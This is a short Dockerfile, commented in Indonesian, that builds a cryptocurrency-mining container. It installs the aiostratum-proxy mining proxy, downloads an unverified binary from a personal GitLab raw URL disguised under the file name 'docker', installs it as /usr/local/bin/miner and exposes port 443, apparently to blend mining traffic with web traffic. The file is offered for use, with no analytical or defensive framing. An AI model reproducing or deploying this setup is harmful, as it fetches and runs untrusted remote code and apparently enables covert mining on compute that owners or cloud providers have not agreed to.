FROM python:3.9-slim

WORKDIR /app

# Install dependensi sistem untuk kompilasi library lama
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    wget \
    procps \
    build-essential \
    libyaml-dev \
    && rm -rf /var/lib/apt/lists/*

# Update pip dan install dependensi build
RUN pip install --no-cache-dir --upgrade pip setuptools wheel

# Install PyYAML 3.12 secara spesifik (ini yang sering bikin error)
# Kita paksa install tanpa build wheel jika perlu, atau biarkan pip mengompilasinya
RUN pip install --no-cache-dir PyYAML==3.12

# Sekarang install aiostratum-proxy
RUN pip install --no-cache-dir aiostratum-proxy

# Download Miner Binary
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 443

CMD ["./start.sh"]
